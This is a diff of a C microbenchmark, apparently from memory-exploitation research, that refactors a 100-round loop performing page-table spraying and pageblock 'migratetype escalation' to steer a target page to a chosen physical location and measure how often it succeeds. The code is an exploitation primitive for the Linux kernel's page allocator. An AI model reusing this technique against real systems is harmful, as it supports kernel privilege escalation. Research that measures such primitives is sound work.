@@ -73,28 +73,6 @@ void unspray_tables() {
     }
 }
 
-void pre_migratetype_escalation() {
-    pageblock = get_page_block();
-    open_spraying_file();
-}
-
-void microbenchmark_migratetype_escalation() {
-    target = (void*)((unsigned long)pageblock + TARGET_OFFSET);
-    mlock((void*)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
-    target_phys = rubench_va_to_pa(target);
-
-    void* bait_ptr = (void*)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
-    migratetype_escalation(bait_ptr, 9, spray_tables);
-    unspray_tables();
-
-    munlock(target, PAGE_SIZE);
-    block_merge(target, 0);
-    mmap((void*)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE,
-         PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE,
-         fd_spray,
-         0);
-}
-
 int post_migratetype_escalation() {
     unsigned long value = rubench_read_phys(target_phys);
 
@@ -115,16 +93,29 @@ int main(void) {
     rubench_open();
 
 
-    int num_rounds = 100;
+    int num_rounds       = 100;
     long long total_time = 0;
     int num_fails        = 0;
 
     for(int round = 0; round < num_rounds; round++) {
         printf("Round %d\n", round);
 
-        pre_migratetype_escalation();
+        pageblock = get_page_block();
+        open_spraying_file();
+        target = (void*)((unsigned long)pageblock + TARGET_OFFSET);
+        mlock((void*)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
+        target_phys = rubench_va_to_pa(target);
 
-        microbenchmark_migratetype_escalation();
+        void* bait_ptr = (void*)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
+        migratetype_escalation(bait_ptr, 9, spray_tables);
+        unspray_tables();
+
+        munlock(target, PAGE_SIZE);
+        block_merge(target, 0);
+        mmap((void*)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE,
+             PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE,
+             fd_spray,
+             0);
 
         if(post_migratetype_escalation()) {
             num_fails++;
